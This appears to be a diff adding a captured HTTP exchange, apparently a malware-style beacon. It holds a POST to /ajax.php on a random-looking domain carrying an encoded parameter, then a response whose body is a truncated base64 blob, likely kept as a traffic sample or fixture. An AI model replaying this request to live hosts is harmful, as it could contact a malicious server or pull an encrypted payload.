@@ -1,0 +1,21 @@
+POST /ajax.php HTTP/1.1
+Host: 897234kjdsf4523234.com
+Content-Length: 85
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Connection: close
+
+1880e80ab9f428ac3b9a5d406f8f3c98=MQsVPrsJWv7eY04cFYpK9SB9x9uZIrVlYA6kN0ZWRQY%3D%0D%0APOST /ajax.php HTTP/1.1
+Host: 897234kjdsf4523234.com
+Content-Length: 85
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Connection: close
+
+1880e80ab9f428ac3b9a5d406f8f3c98=MQsVPrsJWv7eY04cFYpK9SB9x9uZIrVlYA6kN0ZWRQY%3D%0D%0AHTTP/1.1 200 OK
+Server: nginx/1.1.0
+Date: Mon, 15 Aug 2011 16:00:44 GMT
+Content-Type: text/html
+Connection: close
+Content-Length: 209051
+
+GLSgAorCXEcUd3UxaJIIxt0XSIUNw83TwESEteGqAlvuFU6o3zn7rtpJdqJMVYN40/R+dG96/Y5n
+/5TbE+eqpmMV0sHoiTCSYlxZesNdoP8mUec1qjOkwgRBVYtsbh2WjNn53H3HC1SANu+xeaZG
